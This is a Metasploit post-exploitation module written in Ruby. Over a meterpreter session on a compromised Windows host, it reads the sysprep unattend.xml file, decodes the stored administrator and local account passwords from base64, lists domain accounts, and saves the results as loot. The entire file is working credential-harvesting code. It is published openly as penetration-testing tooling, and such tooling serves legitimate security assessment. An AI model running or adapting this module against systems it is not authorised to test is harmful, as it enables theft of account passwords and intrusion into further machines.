##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/file'
require 'rexml/document'

class Metasploit3 < Msf::Post

	include Msf::Post::File

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather Unattended Answer File (unattend.xml) Enumeration',
			'Description'   => %q{
					This module will check the file system for a copy of unattend.xml found in
				Windows Vista, or newer Windows systems.  And then extract sensitive information
				such as usernames and decoded passwords.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'Sean Verity <veritysr1980[at]gmail.com>',
					'sinn3r'
				],
			'References'    =>
				[
					['URL', 'http://technet.microsoft.com/en-us/library/ff715801']
				],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))
	end


	#
	# Determie if unattend.xml exists or not
	#
	def unattend_exists?(xml_path)
		x = session.fs.file.stat(xml_path) rescue nil
		return !x.nil?
	end


	#
	# Read the raw content of unattend.xml
	#
	def load_unattend(xml_path)
		print_status("Reading #{xml_path}")
		f = session.fs.file.new(xml_path)
		buf = ""
		until f.eof?
			buf << f.read
		end

		return buf
	end


	#
	# Extract all the interesting information from unattend.xml,
	# and return an array or tables
	#
	def extract_creds(f)
		begin
			xml = REXML::Document.new(f)
		rescue REXML::ParseException => e
			print_error("Invalid XML format")
			vprint_line(e.message)
			return []
		end
		base_node = 'unattend/settings/component/UserAccounts'
		user_accounts = xml.elements[base_node]

		# If there's no UsersAccounts, then there's no point to continue
		if user_accounts.nil?
			print_error("No UserAccounts node found")
			return []
		end

		cred_tables = []
		account_types = ['AdministratorPassword', 'DomainAccounts', 'LocalAccounts']
		account_types.each do |t|
			node = user_accounts.elements[t]
			next if node.nil?

			case t
			#
			# Extract the password from AdministratorPasswords
			#
			when account_types[0]
				table = Rex::Ui::Text::Table.new({
					'Header'  => 'AdministratorPasswords',
					'Indent'  => 1,
					'Columns' => ['Username', 'Password']
				})

				password = node.elements['Value'].get_text rescue ''
				plaintext = node.elements['PlainText'].get_text rescue 'false'

				if plaintext == 'false'
					password = Rex::Text.decode_base64(password)
					password = password.gsub(/#{Rex::Text.to_unicode('AdministratorPassword')}$/, '')
				end

				if not password.empty?
					table << ['Administrator', password]
					cred_tables << table
				end

			#
			# Extract the sensitive data from DomainAccounts.
			# According to MSDN, unattend.xml doesn't seem to store passwords for domain accounts
			#
			when account_types[1]  #DomainAccounts
				table = Rex::Ui::Text::Table.new({
					'Header'  => 'DomainAccounts',
					'Indent'  => 1,
					'Columns' => ['Username', 'Group']
				})

				node.elements.each do |account_list|
					name = account_list.elements['DomainAccount/Name'].get_text rescue ''
					group = account_list.elements['DomainAccount/Group'].get_text rescue ''

					table << [name, group]
				end

				cred_tables << table if not table.rows.empty?

			#
			# Extract the username/password from LocalAccounts
			#
			when account_types[2]  #LocalAccounts
				table = Rex::Ui::Text::Table.new({
					'Header'  => 'LocalAccounts',
					'Indent'  => 1,
					'Columns' => ['Username', 'Password']
				})

				node.elements.each do |local|
					password = local.elements['Password/Value'].get_text rescue ''
					plaintext = local.elements['Password/Plaintext'].get_text rescue 'false'

					if plaintext == 'false'
						password = Rex::Text.decode_base64(password)
						password = password.gsub(/#{Rex::Text.to_unicode('Password')}$/, '')
					end

					username = local.elements['Name'].get_text rescue ''
					table << [username, password]
				end

				cred_tables << table if not table.rows.empty?
			end
		end

		return cred_tables
	end


	#
	# Save Rex tables separately
	#
	def save_cred_tables(cred_tables)
		cred_tables.each do |t|
			vprint_line("\n#{t.to_s}\n")
			p = store_loot('windows.unattended.creds', 'text/csv', session, t.to_csv)
			print_status("#{t.header} saved as: #{p}")
		end
	end


	#
	# Save the raw version of unattend.xml
	#
	def save_raw(data)
		store_loot('windows.unattended.raw', 'text/plain', session, data)
	end


	def run
		drive = session.fs.file.expand_path("%SystemDrive%")
		xml_path = "#{drive}\\Windows\\System32\\sysprep\\unattend.xml"

		# If unattend.xml doesn't exist, no point to continue
		if not unattend_exists?(xml_path)
			print_error("#{xml_path} not found")
			return
		end

		# If unattend.xml is actually empty, no point to continue, either.
		f = load_unattend(xml_path)
		if f.empty?
			print_error("#{xml_path} is empty")
			return
		end

		# Save the raw version in case the user wants more information
		p = save_raw(f)
		print_status("Raw version of unattend.xml saved as: #{p}")

		# Extract the credentials
		cred_tables = extract_creds(f)

		# Save the data
		save_cred_tables(cred_tables)
	end
end
